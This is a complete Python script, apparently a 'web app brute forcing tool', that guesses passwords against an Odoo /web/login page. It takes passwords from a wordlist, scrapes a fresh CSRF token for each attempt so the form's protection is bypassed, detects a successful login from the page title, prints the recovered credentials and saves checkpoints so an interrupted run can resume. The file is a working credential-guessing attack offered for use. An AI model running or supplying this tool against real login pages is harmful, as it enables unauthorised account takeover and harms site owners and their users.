import requests
import re
import sys
import os
from bs4 import BeautifulSoup


class Terminal:
    def __init__(self):
        self.intro = "Advanced Python Web App Brute Forcing Tool\n"
        self.prompt = "url [http://ip_address] >> "
        self.default_url = "https://Replace_With_Your_Target_Domain"  # Default URL

    def run(self):
        print(self.intro)
        url = input("Enter the URL (press Enter for default): ").strip()
        if not url:
            url = self.default_url  # Use the default URL if no URL is specified
        bruteforcer(url)


def bruteforcer(url):
    session = requests.session()
    # Add a file containing a list of passwords
    with open("pass.txt", "r") as file:
        content = file.readlines()
        passwords = [x.strip() for x in content]

    usernames = ["Replace_With_Your_Username"]  # List of usernames to try "user1, user2, user3"

    for username in usernames:
        checkpoint = load_checkpoint(username)
        start_index = checkpoint["start_index"] if checkpoint else 0
        tried_lists = checkpoint["tried_lists"] if checkpoint else 0

        try:
            for i in range(start_index, len(passwords)):
                password = passwords[i]
                login = session.get(f"{url}/web/login")
                soup = BeautifulSoup(login.text, "html.parser")
                csrf_token = soup.find("input", {"name": "csrf_token"})
                if csrf_token is None:
                    print("Failed to retrieve CSRF token.")
                    save_checkpoint(username, i, tried_lists)
                    sys.exit()

                csrf_token = csrf_token["value"]
                print(f"csrf-token: {csrf_token}\n")
                post_data = {
                    "login": username,  # Use the current username in the loop
                    "password": password,
                    "csrf_token": csrf_token,
                }

                validation = session.post(f"{url}/web/login", data=post_data)

                soup = BeautifulSoup(validation.text, "html.parser")
                page_title = soup.title.text if soup.title else ""
                
                #Please include a page title once the login process is successful.
                if page_title == "Odoo": 
                    print(f"Login Success!!!!\nYour credentials below:\n{post_data['login']}:{password}")
                    print("Goodbye")
                    clear_checkpoint(username)
                    sys.exit()

                # Save checkpoint after trying each password
                save_checkpoint(username, i + 1, tried_lists)

            print(f"Finished trying passwords for user: {username}\n")
            clear_checkpoint(username)

        except KeyboardInterrupt:
            print("\nProgram interrupted. Saving progress...")
            save_checkpoint(username, i, tried_lists)
            sys.exit()

    print("Login failed for all attempts.")


def load_checkpoint(username):
    try:
        with open(f"{username}_checkpoint.txt", "r") as file:
            content = file.readline()
            if content:
                checkpoint_data = content.split(",")
                start_index = int(checkpoint_data[0])
                tried_lists = int(checkpoint_data[1])
                return {"start_index": start_index, "tried_lists": tried_lists}
    except FileNotFoundError:
        return None


def save_checkpoint(username, start_index, tried_lists):
    with open(f"{username}_checkpoint.txt", "w") as file:
        file.write(f"{start_index},{tried_lists}")


def clear_checkpoint(username):
    try:
        os.remove(f"{username}_checkpoint.txt")
    except FileNotFoundError:
        pass


if __name__ == "__main__":
    terminal = Terminal()
    terminal.run()
